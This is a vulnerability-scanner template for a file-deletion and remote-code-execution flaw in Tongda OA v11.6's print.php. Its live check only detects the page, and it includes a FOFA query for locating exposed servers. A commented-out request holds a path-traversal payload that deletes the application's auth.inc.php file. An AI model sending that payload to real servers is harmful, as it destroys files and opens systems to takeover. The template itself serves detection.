id: tongda-oa-print-filedelete-and-rce
info:
  name: 通达 OA v11.6 print.php 任意文件删除 - RCE
  author: leadlife
  severity: critical
  description: 
  reference: 
    - https://github.com/Threekiii/Awesome-POC/blob/master/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA%20v11.6%20print.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%26RCE.md
  metadata:
    max-request: 1
    verified: true
    fofa-query: app="TDXK-通达OA" || icon_hash="-759108386"
  tags: tongda,filedelete,rce,oa
http:
  - raw:
      - |+
        GET /module/appbuilder/assets/print.php HTTP/1.1
        Host: {{Hostname}}
      
      # - |+
      #   GET /module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php HTTP/1.1
      #   Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(body,"业务生成器")'
        condition: and
